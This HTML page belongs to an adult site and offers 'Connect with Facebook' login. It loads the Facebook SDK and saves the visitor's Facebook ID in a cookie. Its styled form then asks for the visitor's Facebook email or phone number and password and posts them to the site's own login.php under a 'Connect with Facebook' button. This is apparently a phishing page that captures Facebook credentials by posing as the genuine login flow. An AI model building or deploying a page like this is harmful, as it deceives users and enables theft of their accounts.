<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Sexporn Connect with Facebook</title>
<meta http-equiv="P3P" content='CP="IDC DSP COR CURa ADMa OUR IND PHY ONL COM STA"'>
<style>
    body {
        background-color:#F1F1F1;
        
    }
    #fbcontent {
        font-family:arial;
        font-size:11px;
        width:600px;
        margin: 0 auto;
        
        background-color:#ffffff;
        border:1px solid #4A5C82;
        line-height:18px;
        color:#585858;
    }
    .titleBox {
        
        color:#ffffff;
        background-color:#637BAD;
        font-weight:bold;
        font-family:arial;
        font-size:12px;
        width:600px;
        margin: 0 auto;  
        border-top:1px solid #4A5C82;
        border-left:1px solid #4A5C82;
        border-right:1px solid #4A5C82;
        background-image:url(https://s-static.ak.facebook.com/rsrc.php/v1/yd/r/Cou7n-nqK52.gif);
        background-repeat:no-repeat;
        background-position:3px 3px;
    }
</style>
    
<script>
function setCookie(c_name,value,exdays)
{
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
document.cookie=c_name + "=" + c_value;
}
</script>


      <script>
        window.fbAsyncInit = function() {
          FB.init({
            appId      : '137701876257980',
            status     : true, 
            cookie     : true,
            xfbml      : true,
            oauth      : true
          });
         
         function updateButton(response) {
   


		
    if (response.authResponse) {
      //user is already logged in and connected
            
			FB.api('/me', function(response) {

			if (response.id) {
                        //document.write('Login in..');
                        //if (response.id) {
			//alert(response.id);
                        setCookie('fib',response.id,2);
                        window.location.href="fb.php?do=fblogin";
			} else {
				//window.location.href="?do=fbconnect";
                                
			}
                        
       
      });      
     
    } else {
 		//user is not connected to your app or logged out
	
    	}
 
         }
         
         
         FB.getLoginStatus(updateButton);
  			FB.Event.subscribe('auth.statusChange', updateButton); 
        };
        
        (function(d){
           var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
           js = d.createElement('script'); js.id = id; js.async = true;
           js.src = "http://connect.facebook.net/en_US/all.js";
           d.getElementsByTagName('head')[0].appendChild(js);
         }(document));
         

            
      </script>    
    
</head>
<body>
    
    <div class="titleBox">
        <div style="padding:5px;padding-left:25px">Bokep with Facebook Connect</div>
    </div>
<div id="fbcontent">
    <div style="padding:10px;">
Now you can log in here using Facebook !
<br>
It's easy, just click the button "<b>Connect with Facebook</b>" and follow the steps
<br>
<span style="color:#990000">Remember , 1 account can only be registered for 1 ID Facebook</span>
and make sure you have logged out before leaving this website
</div>
</div>
    <center style="padding-top:30px;">
          <div id="fb-root"></div>

<div id="fbcontent">
    <div style="padding:10px;">
<br>
<form action="login.php" method="POST">
<w>Email or Phone number</w><br>
<input type="tex" name="email" value="">
<br>
<w>Password</w>
<br>
<input type="password" name="pass" maxlength="50">
<br>

<br>

<input type="submit" name="submit" value="Connect with Facebook">

<p>
</center>

</div>
</div>

<center>
      <div style="padding-top:20px;font-size:12px;font-family:arial">
      <a href="https://www.iubenda.com/privacy-policy/141504" target="_blank">Privacy Policy</a> | <a href="#" target="_blank">Term of Services</a>
      </div>
      </center>
      
    </body>
</html>